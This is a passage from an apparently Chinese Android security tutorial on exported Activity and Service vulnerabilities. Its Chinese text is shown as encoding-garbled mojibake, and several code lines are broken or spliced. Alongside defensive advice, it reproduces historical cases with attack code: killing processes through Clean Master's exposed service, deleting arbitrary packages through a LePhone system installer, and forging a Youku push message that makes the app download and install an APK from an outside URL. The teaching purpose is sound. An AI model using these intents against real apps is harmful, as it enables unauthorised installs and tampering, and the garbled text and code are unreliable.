class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.ä½¿ç”¨è‡ªå®šä¹‰çš„Action</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Aç¨‹ç¿ ä¸­è°ƒç”¨ä»£ç ä¸ºï¼š</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.test.action.PLAYER&quot;</span>);              </span><br><span class="line">startActivity(intent);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Bç¨‹åºä¸­çš„AndroidManifest.xmlä¸­å¯åŠ¨Activityçš„intent-filter</span></span><br><span class="line">    &lt;intent-filter&gt;</span><br><span class="line">                  &lt;action android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><span class="line">                   &lt;action android:name=<span class="string">&quot;com.test.action.PLAYER&quot;</span> /&gt;</span><br><span class="line">                   &lt;category android:name=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span><br><span class="line">                       &lt;!--å¿…é¡»ï¼Œå¦åˆ™æ— æ•ˆ--&gt;</span><br><span class="line">                  &lt;category android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br><span class="line">    &lt;/intent-filter&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.ä½¿ç”¨åŒ…ç±»å</span></span><br><span class="line">                      </span><br><span class="line"><span class="comment">//Aç¨‹åºä¸­è°ƒç”¨çš„ä»£ç ï¼š</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intetn</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;åŒ…å&quot;</span>,<span class="string">&quot;ç±»å&quot;</span>);</span><br><span class="line">startActivity(intent);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.ä½¿ç”¨ComponentName</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="type">ComponentName</span> <span class="variable">comp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;åŒ…å&quot;</span>,<span class="string">&quot;ç±»å&quot;</span>);</span><br><span class="line">intent.setComponent(comp);</span><br><span class="line">startActivity();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Bç¨‹åºè¢«è°ƒç”¨ä¸­AndroidManifest.xmlä¸­å¯åŠ¨Activityçš„intent-filterä¸éœ€è¦ç‰¹åˆ«åŠ å…¥å…¶å®ƒä¿¡æ¯ï¼Œå¦‚ä¸‹å³å¯ï¼š</span></span><br><span class="line">      &lt;intent-filter&gt;</span><br><span class="line">          &lt;action android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><span class="line">        &lt;category android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br><span class="line">      &lt;/intent-filter&gt;</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å®‰å…¨é˜²æŠ¤ï¼š</span><br><span class="line">  <span class="string">``</span>ï¼ˆ<span class="string">``</span><span class="number">1</span><span class="string">``</span>ï¼‰ç©ºæŒ‡é’ˆå¼‚å¸¸ã€ç±»å‹è½¬æ¢å¼‚å¸¸ã€æ•°ç»„è¶Šç•Œè®¿é—®å¼‚å¸¸ã€ç±»æœªå®šä¹‰å¼‚å¸¸ã€å…¶å®ƒå¼‚å¸¸</span><br><span class="line">  <span class="string">``</span>ï¼ˆ<span class="string">``</span><span class="number">2</span><span class="string">``</span>ï¼‰è°¨æ…å¤„ç†æ¥æ”¶çš„intentä»¥åŠå…¶æºå¸¦çš„ä¿¡æ¯ï¼Œå¯¹æ¥æ”¶åˆ°çš„ä»»ä½•æ•°æ®åš<span class="string">``</span><span class="keyword">try</span><span class="string">``</span>/<span class="string">``</span><span class="keyword">catch</span>å¤„ç†ï¼Œä»¥åŠå¯¹ä¸ç¬¦åˆé¢„æœŸæ•°æ®åšå¼‚å¸¸å¤„ç†</span><br><span class="line">æ€»ç»“ï¼š</span><br><span class="line"><span class="number">1.</span><span class="string">``</span>ä¸éœ€è¦è¢«å¤–éƒ¨è°ƒç”¨çš„activityè®¾ç½®android:exported<span class="string">``</span>=<span class="string">``</span><span class="string">&quot;false&quot;</span><span class="string">``</span>ï¼›</span><br></pre></td></tr></table></figure><p><strong>å®‰å…¨é˜²æŠ¤</strong>ï¼š</p><p>â€‹(1)ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼Œç±»å‹è½¬æ¢å¼‚å¸¸ï¼Œæ•°ç»„è¶Šç•Œè®¿é—®å¼‚å¸¸ï¼Œç±»æœªå®šä¹‰å¼‚å¸¸ï¼Œå…¶ä»–å¼‚å¸¸</p><p>â€‹    (2)è°¨æ…å¤„ç†æ¥æ”¶çš„intentä»¥åŠå…¶æºå¸¦çš„ä¿¡æ¯ï¼Œå¯¹æ¥æ”¶åˆ°çš„ä»»ä½•æ•°æ®åš<code>try/catch</code>å¤„ç†ï¼Œä»¥åŠå¯¹ä¸ç¬¦åˆé¢„æœŸæ•°æ®åšå¼‚å¸¸å¤„ç†</p><p>æ€»ç»“ï¼š</p><p>1.ä¸éœ€è¦è¢«å¤–éƒ¨è°ƒç”¨çš„activityè®¾ç½®android:exported<code>=</code>â€œfalseâ€ï¼›</p><p>2.è‹¥éœ€è¦å¤–éƒ¨è°ƒç”¨ï¼Œéœ€è‡ªå®šä¹‰signatureæˆ–è€…signatureOrSystemçº§åˆ«çš„æƒé™ï¼›</p><p>3.æ³¨å†Œçš„ç»„ä»¶è¯·ä¸¥æ ¼æ ¡éªŒè¾“å…¥å‚æ•°ï¼Œæ³¨æ„ç©ºå€¼åˆ¤å®šå’Œç±»å‹è½¬æ¢åˆ¤æ–­</p><h2 id="Serviceç»„ä»¶ç›¸å…³æ¼æ´">Serviceç»„ä»¶ç›¸å…³æ¼æ´</h2><h3 id="serviceåŸºæœ¬ä»‹ç»">serviceåŸºæœ¬ä»‹ç»</h3><p><strong>æ­¥éª¤</strong>ï¼š</p><ul><li>â€‹åˆ›å»ºä¸€ä¸ªserviceæœåŠ¡</li><li>æˆ‘ä»¬é‡å†™æœåŠ¡ä¸­çš„ä¸‰å¤§æ–¹æ³•onCreate()ï¼ŒonStartCommand()ï¼ŒonDestory()</li></ul><p><strong>è¯¦è§£</strong></p><ul><li>onCreate()æ–¹æ³•ä¼šåœ¨æœåŠ¡åˆ›å»ºçš„æ—¶å€™è°ƒç”¨</li><li>onStartCommand()æ–¹æ³•ä¼šåœ¨æ¯æ¬¡æœåŠ¡å¯åŠ¨çš„æ—¶å€™è°ƒç”¨ï¼Œé€šå¸¸æˆ‘ä»¬å¸Œæœ›æœåŠ¡åœ¨å¼€å¯ç«‹åˆ»æ‰§è¡ŒæŸä¸ªåŠ¨ä½œå°±ä¼šåœ¨onStartCommand()é‡Œ</li><li>onDestroy()ä¼šåœ¨æœåŠ¡é”€æ¯çš„æ—¶å€™è°ƒç”¨</li></ul><h3 id="serviceå¯åŠ¨">serviceå¯åŠ¨</h3><p><img src="/posts/f416437f.htm/image-20240922163909306.png" alt="image-20240922163909306"></p><p><strong>å¯åŠ¨æ–¹å¼</strong></p><ul><li>startServiceï¼šä¸»è¦ç”¨äºå¯åŠ¨ä¸€ä¸ªæœåŠ¡æ‰§è¡Œåå°ä»»åŠ¡ï¼Œä¸è¿›è¡Œé€šä¿¡ï¼Œè€Œä¸”å¿…é¡»ç”¨stopServiceæ¥ç»“æŸï¼Œä¸è°ƒç”¨ä¼šå¯¼è‡´activityç»“æŸè€ŒServiceè¿˜è¿è¡Œ</li><li>bindServiceï¼šè¯¥æ–¹æ³•å¯åŠ¨çš„æœåŠ¡è¿˜å¯ä»¥è¿›è¡Œé€šä¿¡ï¼Œå¯åŠ¨çš„Serviceå¯ä»¥æœ‰unbindServiceæ¥ç»“æŸï¼Œä¹Ÿå¯ä»¥åœ¨activityç»“æŸä¹‹åè‡ªåŠ¨ç»“æŸ</li><li>startService åŒæ—¶ä¹Ÿ bindService å¯åŠ¨çš„æœåŠ¡ï¼šåœæ­¢æœåŠ¡åº”åŒæ—¶ä½¿ç”¨stopServiceå’ŒunbindService</li></ul><p><strong>StartService</strong></p><p>æˆ‘ä»¬æ ¹æ®Intentçš„å¯åŠ¨æ–¹å¼ï¼Œåˆå¯ä»¥é€šè¿‡æ˜¾å¼å¯åŠ¨å’Œéšå¼å¯åŠ¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">æ˜¾ç¤ºå¯åŠ¨ï¼š</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>,TestService.class);</span><br><span class="line">startService(intent);</span><br><span class="line"></span><br><span class="line">éšå¼å¯åŠ¨ï¼š</span><br><span class="line">(<span class="number">1</span>) ä½¿ç”¨Action </span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;xxx&quot;</span>);<span class="comment">//serviceä¸­å®šä¹‰çš„action</span></span><br><span class="line">intent.setPackage(getPackageName);éœ€è¦è®¾ç½®çš„åº”ç”¨åŒ…å</span><br><span class="line">startService(intent);</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>) ä½¿ç”¨åŒ…åå¯åŠ¨</span><br><span class="line"><span class="type">IntenComponentName</span> <span class="variable">componentName</span> <span class="operator">=</span> New <span class="title function_">ComponentName</span><span class="params">(getPackageName()</span>,<span class="string">&quot;com.example.testservices.TestService&quot;</span>);</span><br><span class="line">intent.setComponent(componentName);</span><br><span class="line">startService(intent);<span class="type">t</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br></pre></td></tr></table></figure><h3 id="bindServiceå¯åŠ¨">bindServiceå¯åŠ¨</h3><p>æˆ‘ä»¬è¦å®ç°æœåŠ¡æˆ–æ´»åŠ¨ä¹‹é—´çš„é€šè®¯ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨bindé€šä¿¡æœºåˆ¶</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åŸç†è§£æ</span><br><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰bindServiceå¯åŠ¨çš„æœåŠ¡å’Œè°ƒç”¨è€…æ˜¯å…¸å‹çš„<span class="keyword">client</span>-serviceæ¨¡å¼ã€‚è°ƒç”¨è€…æ˜¯<span class="keyword">client</span>ï¼Œserviceæ˜¯serviceç«¯ï¼Œserviceåªæœ‰ä¸€ä¸ªï¼Œä½†æ˜¯ç»‘å®šåˆ°serviceä¸Šçš„<span class="keyword">client</span>å¯ä»¥æœ‰ä¸€ä¸ªæˆ–è€…å¤šä¸ª</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰<span class="keyword">client</span>å¯ä»¥é€šè¿‡IBinderæ¥å£è·å–Serviceå®ä¾‹ï¼Œä»è€Œå®ç°åœ¨<span class="keyword">client</span>ç«¯ç›´æ¥è°ƒç”¨serviceï¼Œå¯ä»¥çµæ´»äº¤äº’</span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰bindServiceå¯åŠ¨çš„æœåŠ¡çš„ç”Ÿå‘½å‘¨æœŸä¸ç»‘å®šçš„<span class="keyword">client</span>æ¯æ¯ç›¸å…³ï¼Œå½“<span class="keyword">client</span>é”€æ¯æ—¶ï¼Œè§£é™¤ç»‘å®šï¼Œæˆ–è€…ä½¿ç”¨unbindService()æ–¹æ³•è§£é™¤ç»‘å®š</span><br></pre></td></tr></table></figure><p><strong>å®ç°æ­¥éª¤</strong></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">æœåŠ¡ç«¯</span><br><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰å®šä¹‰ä¸€ä¸ªç±»ç»§æ‰¿Service</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰åœ¨Serviceçš„onBind()æ–¹æ³•ä¸­è¿”å›IBinderç±»å‹çš„å®ä¾‹</span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰åœ¨serviceä¸­åˆ›å»ºbinderçš„å†…éƒ¨ç±»ï¼ŒåŠ å…¥ç±»ä¼¼getService()æ–¹æ³•è¿”å›Serviceï¼Œè¿™æ ·ç»‘å®šçš„<span class="keyword">client</span>å°±å¯ä»¥é€šè¿‡getService()æ–¹æ³•è·å¾—Serviceå®ä¾‹äº†</span><br><span class="line"></span><br><span class="line">å®¢æˆ·ç«¯</span><br><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰åœ¨Manifestä¸­é…ç½®Service</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰åˆ›å»ºServiceConnectionç±»å‹å®ä¾‹ï¼Œå¹¶é‡å†™onServiceConnected()æ–¹æ³•å’ŒonServiceDisconnected()æ–¹æ³•</span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰å½“æ‰§è¡Œåˆ°onServiceConnectedå›è°ƒæ—¶ï¼Œå¯é€šè¿‡IBinderå®ä¾‹å¾—åˆ°Serviceå®ä¾‹å¯¹è±¡ï¼Œè¿™æ ·å¯å®ç°<span class="keyword">client</span>ä¸Serviceçš„è¿æ¥</span><br><span class="line">ï¼ˆ<span class="number">4</span>ï¼‰onServiceDisconnectedå›è°ƒè¢«æ‰§è¡Œæ—¶ï¼Œè¡¨ç¤º<span class="keyword">client</span>ä¸Serviceæ–­å¼€è¿æ¥ï¼Œåœ¨æ­¤å¯ä»¥å†™ä¸€äº›æ–­å¼€è¿æ¥åéœ€è¦åšçš„å¤„ç†</span><br><span class="line">ï¼ˆ<span class="number">5</span>ï¼‰é€šè¿‡Intent å¯åŠ¨æœåŠ¡Intent intent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>,MyService.<span class="keyword">class</span>);</span><br><span class="line">ï¼ˆ<span class="number">6</span>ï¼‰ä½¿ç”¨Contextçš„bindService(Intent,ServiceConnection,<span class="built_in">int</span>)æ–¹æ³•å¯åŠ¨è¯¥Service</span><br><span class="line">ï¼ˆ<span class="number">7</span>ï¼‰ä¸å†ä½¿ç”¨æ—¶ï¼Œè°ƒç”¨unbindService(ServiceConnection)æ–¹æ³•åœæ­¢è¯¥æœåŠ¡</span><br></pre></td></tr></table></figure><h3 id="Serviceæ¼æ´åŸç†åˆ†æ">Serviceæ¼æ´åŸç†åˆ†æ</h3><p><strong>æ¼æ´ç§ç±»</strong></p><ul><li>æƒé™æå‡</li><li>serviceåŠ«æŒ</li><li>æ¶ˆæ¯ä¼ªé€ </li><li>æ‹’ç»æœåŠ¡</li></ul><p>å¦‚æœä¸€ä¸ªå¯¼å‡ºçš„Serviceæ²¡æœ‰åšä¸¥æ ¼çš„é™åˆ¶ï¼Œä»»ä½•åº”ç”¨éƒ½å¯ä»¥å»å¯åŠ¨å¹¶ç»‘å®šåˆ°è¿™ä¸ªServiceä¸Šï¼Œå–å†³äºè¢«æš´éœ²çš„åŠŸèƒ½ï¼Œ è¿™å¯ä»¥æ˜¯ä¸€ä¸ªåº”ç”¨å»æ‰§è¡Œæœªæˆæƒçš„è¡Œä¸ºï¼Œè·å–æ•æ„Ÿä¿¡æ¯æˆ–æ±¡æŸ“ä¿®æ”¹å†…éƒ¨åº”ç”¨çš„çŠ¶æ€é€ æˆå¨èƒã€‚</p><h4 id="æƒé™æå‡">æƒé™æå‡</h4><p><strong>åŸç†ä»‹ç»</strong></p><p>å½“ä¸€ä¸ªserviceé…ç½®äº† intent-filter é»˜è®¤æ˜¯è¢«å¯¼å‡ºçš„ï¼Œå¦‚æœæ²¡æœ‰å¯¹è°ƒç”¨Serviceè¿›è¡Œæƒé™é™åˆ¶æˆ–è€…æ²¡æœ‰å¯¹è°ƒç”¨è€…çš„èº«ä»½è¿›è¡Œæœ‰æ•ˆéªŒè¯ï¼Œé‚£ä¹ˆæ¶æ„æ„é€ çš„appéƒ½å¯ä»¥å¯¹æ­¤Serviceä¼ å…¥æ°å½“çš„å‚æ•°è¿›è¡Œè°ƒç”¨ï¼Œå¯¼è‡´æ¶æ„è¡Œä¸ºå‘ç”Ÿã€‚</p><p><strong>æ¼æ´å¤ç°</strong></p><p>æ¡ˆä¾‹1 <a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-048735"><strong>çŒè±¹æ¸…ç†å¤§å¸ˆå†…å­˜æ¸…ç†æƒé™æ³„éœ²æ¼æ´</strong></a></p><p>æ¼æ´æè¿°ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Androidåº”ç”¨ç¨‹åºçŒè±¹æ¸…ç†å¤§å¸ˆï¼ˆåŸé‡‘å±±æ¸…ç†å¤§å¸ˆï¼‰``<span class="number">4.0</span>``.``<span class="number">1</span>``åŠä»¥ä¸‹ç‰ˆæœ¬å­˜åœ¨æƒé™æ³„æ¼æ¼æ´ï¼Œæ³„éœ²çš„æƒé™ä¸ºandroid<span class="selector-class">.permission</span>.RESTART_PACKAGESï¼Œç”¨æ¥ç»“æŸè¿›ç¨‹æ¥è¾¾åˆ°æ¸…ç†å†…å­˜çš„ç›®çš„ã€‚å½“æ²¡æœ‰ç”³è¯·æ­¤æƒé™çš„appå‘çŒè±¹æ¸…ç†å¤§å¸ˆå‘é€ç›¸åº”çš„intentæ—¶ï¼Œä¾¿å¯ä»¥ç»“æŸåå°è¿è¡Œçš„éƒ¨åˆ†appè¿›ç¨‹ã€‚</span><br><span class="line">çŒè±¹æ¸…ç†å¤§å¸ˆæš´éœ²äº†com<span class="selector-class">.cleanmaster</span><span class="selector-class">.appwidget</span>.WidgetServiceæœåŠ¡ç»„ä»¶ï¼ˆè¯¦è§ä¸‹å›¾ï¼‰ï¼Œå½“å‘æ­¤æœåŠ¡å‘é€actionä¸ºcom<span class="selector-class">.cleanmaster</span><span class="selector-class">.appwidget</span>.ACTION_FASTCLEANçš„intentæ—¶ï¼Œä¾¿å¯ç»“æŸåå°è¿è¡Œçš„ä¸€äº›appè¿›ç¨‹ã€‚</span><br></pre></td></tr></table></figure><p><img src="https://bbs.kanxue.com/upload/attach/202109/905443_UNDUAUVQQNFQGW6.png" alt="image-20210908160946499"></p><p><strong>æ”»å‡»ä»£ç ï¼š</strong></p><p>ä½¿ç”¨intentï¼Œå¼€å¯serviceæœåŠ¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.cleanmaster.appwidget.ACTION_FASTCLEAN&quot;</span>);</span><br><span class="line">intent.setPackage(<span class="string">&quot;com.cleanmaster.appwidget.WidgetService&quot;</span>);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure><p>æ¡ˆä¾‹äºŒï¼š<a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2010-0509"><strong>ä¹phoneæ‰‹æœºä»»æ„è½¯ä»¶åŒ…å®‰è£…åˆ é™¤æ¼æ´</strong></a></p><p><strong>æ¼æ´æè¿°</strong>ï¼š</p><p>ä¹phoneæ‰‹æœºå‡ºå‚é»˜è®¤åŒ…å«ä¸€ä¸ªåä¸ºjp.aplix.midp.toolsçš„åº”ç”¨åŒ…ã€‚æœ¬åº”ç”¨ä»¥systemæƒé™è¿è¡Œï¼Œå¹¶å‘å…¶ä»–åº”ç”¨æä¾›ApkInstalleræœåŠ¡ï¼Œç”¨æ¥è¿›è¡Œå¯¹Apkæ–‡ä»¶çš„å®‰è£…å’Œåˆ é™¤ã€‚é€šè¿‡å‘ApkInstalleræœåŠ¡ä¼ é€’æ„é€ å¥½çš„å‚æ•°ï¼Œæ²¡æœ‰å£°æ˜ä»»ä½•æƒé™çš„åº”ç”¨å³å¯è¾¾åˆ°å®‰è£…å’Œåˆ é™¤ä»»æ„Packageçš„è¡Œä¸ºï¼Œå¯¹ç³»ç»Ÿå®‰å…¨æ€§äº§ç”Ÿæå¤§å½±å“ã€‚</p><p><strong>æ”»å‡»ä»£ç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">in.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;jp.aplix.midp.tools&quot;</span>,<span class="string">&quot;jp.aplix.midp.tools.ApkInstaller&quot;</span>));</span><br><span class="line">in.putExtra(<span class="string">&quot;action&quot;</span>, <span class="string">&quot;deleteApk&quot;</span>);</span><br><span class="line">in.putExtra(<span class="string">&quot;pkgName&quot;</span>, <span class="string">&quot;xxxxx&quot;</span>);</span><br><span class="line">startService(in);</span><br></pre></td></tr></table></figure><h4 id="serviceåŠ«æŒ">serviceåŠ«æŒ</h4><p><strong>æ”»å‡»åŸç†</strong>ï¼šéšå¼å¯åŠ¨serviceï¼Œå½“å­˜åœ¨åŒåserviceæ—¶ï¼Œå…ˆå®‰è£…åº”ç”¨çš„serviceä¼˜å…ˆçº§é«˜</p><h4 id="æ¶ˆæ¯ä¼ªé€ ">æ¶ˆæ¯ä¼ªé€ </h4><p><strong>åŸç†ä»‹ç»</strong>ï¼š</p><p>æš´éœ²çš„serviceå¯¹å¤–æ¥æ”¶Intentï¼Œå¦‚æœæ„é€ æ¶æ„çš„æ¶ˆæ¯æ”¾åœ¨Intentä¸­ä¼ è¾“ï¼Œè¢«è°ƒç”¨çš„Serviceæ¥æ”¶å¯èƒ½äº§ç”Ÿå®‰å…¨éšæ‚£</p><p><strong>æ¼æ´å¤ç°</strong></p><p>æ¡ˆä¾‹ï¼š<a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-094635"><strong>ä¼˜é…·Android 4.5å®¢æˆ·ç«¯å‡çº§æ¼æ´</strong></a></p><p><strong>æ¼æ´æè¿°</strong></p><p>ä¼˜é…·Android 4.5å®¢æˆ·ç«¯ç»„ä»¶æš´éœ²å¯¼è‡´ç¬¬ä¸‰æ–¹åº”ç”¨å¯ä»¥è§¦å‘å…¶å‡çº§è¿‡ç¨‹ï¼ŒåŒæ—¶å¯ä»¥æŒ‡å®šå‡çº§ä¸‹è½½çš„URLåœ°å€ï¼Œå¯å¯¼è‡´ä»»æ„åº”ç”¨å®‰è£…ï¼</p><p>æš´éœ²ç»„ä»¶ï¼š<code>com.youku.service.push.StartActivityService</code></p><p>è¯¥ç»„ä»¶å¯¹åº”çš„éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onHandleIntent</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        Intent v0;</span><br><span class="line">        String v23;</span><br><span class="line">        <span class="type">Serializable</span> <span class="variable">pushMsg</span> <span class="operator">=</span> intent.getSerializableExtra(<span class="string">&quot;PushMsg&quot;</span>);</span><br><span class="line">        ......</span><br><span class="line">        AppVersionManager.getInstance(Youku.context).showAppAgreementDialog();</span><br><span class="line">        <span class="keyword">switch</span>(pushMsg.type) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                <span class="keyword">goto</span> label_53;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    label_53:</span><br><span class="line">        intent.setFlags(<span class="number">876609536</span>);</span><br><span class="line">        intent.setClass(<span class="built_in">this</span>, UpdateActivity.class);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateurl&quot;</span>, pushMsg.updateurl);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateversion&quot;</span>, pushMsg.updateversion);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updatecontent&quot;</span>, pushMsg.updatecontent);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateType&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">this</span>.startActivity(intent);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p><strong>æ¼æ´åˆ†æ</strong></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°ä»Intentä»è·å–åä¸ºPushMsgçš„Serializableçš„æ•°æ®ï¼Œå¹¶æ ¹æ®å…¶æˆå‘˜typeæ¥æ‰§è¡Œä¸åŒçš„æµç¨‹ï¼Œå½“typeå€¼ä¸º1æ—¶ï¼Œæ‰§è¡ŒAppçš„å‡çº§æ“ä½œã€‚å‡çº§æ‰€éœ€çš„ç›¸å…³æ•°æ®å¦‚appçš„ä¸‹è½½åœ°å€ç­‰ä¹Ÿæ˜¯ä»è¯¥åºåˆ—åŒ–æ•°æ®ä¸­è·å–ã€‚å‡çº§çš„å…·ä½“æµç¨‹åœ¨com.youku.ui.activity.UpdateActivityä¸­ï¼Œç®€å•åˆ†æåå‘ç°å‡çº§è¿‡ç¨‹æœªå¯¹ä¸‹è½½åœ°å€ç­‰è¿›è¡Œåˆ¤æ–­ï¼Œå› æ­¤å¯ä»¥ä»»æ„æŒ‡å®šè¯¥åœ°å€ã€‚</p><p><strong>æ¼æ´æ”»å‡»</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä½¿ç”¨ä¸‹é¢ä»£ç  ä¿®æ”¹pushMsgå†…å®¹ï¼Œå¹¶é‡æ‰“åŒ…è¿›ç›®æ ‡åº”ç”¨ä¸­ è¿›è€Œå®ç°ä¼ªé€ </span></span><br><span class="line"><span class="type">PushMsg</span> <span class="variable">pushMsg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PushMsg</span>();</span><br><span class="line">pushMsg.type = <span class="number">1</span>;</span><br><span class="line">pushMsg.updateurl = <span class="string">&quot;http://gdown.baidu.com/data/wisegame/41839d1d510870f4/jiecaojingxuan_51.apk&quot;</span>;</span><br><span class="line">pushMsg.updatecontent = <span class="string">&quot;This is Fake&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.youku.phone&quot;</span>,<span class="string">&quot;com.youku.service.push.StartActivityService&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;PushMsg&quot;</span>, pushMsg);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­PushMsgç±»ä¸éœ€è¦å®Œæ•´å®ç°ï¼Œåªéœ€è¦ç¼–è¯‘é€šè¿‡å³å¯ï¼›<br>2.åç¼–è¯‘ä¼˜é…·å®¢æˆ·ç«¯çš„Appå¾—åˆ°smaliä»£ç 